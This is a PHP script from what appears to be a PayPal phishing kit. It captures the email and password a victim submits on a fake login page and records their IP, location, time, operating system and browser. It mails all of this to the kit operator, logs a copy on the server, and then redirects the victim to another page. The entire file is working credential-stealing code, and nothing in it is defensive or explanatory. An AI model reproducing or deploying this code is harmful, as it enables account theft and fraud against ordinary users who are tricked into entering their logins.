<?php
header('Location: ../safe.php');
require 'Email.php';
require 'getdata.php';
$email = $_POST['email'];
$password = $_POST['pass'];
$to = "$yourmail";
$subject = "👑PPL LOGIN-INFO👑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>PPL LOGIN FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [PPL Email] = <font style='color:#0070ba;'>$email</font><br>
<font style='color:#9c0000;'>✪</font> [PPL Password] = <font style='color:#0070ba;'>$password</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>Thankx to ✪ LugoCode ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:🍎Login🍎 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>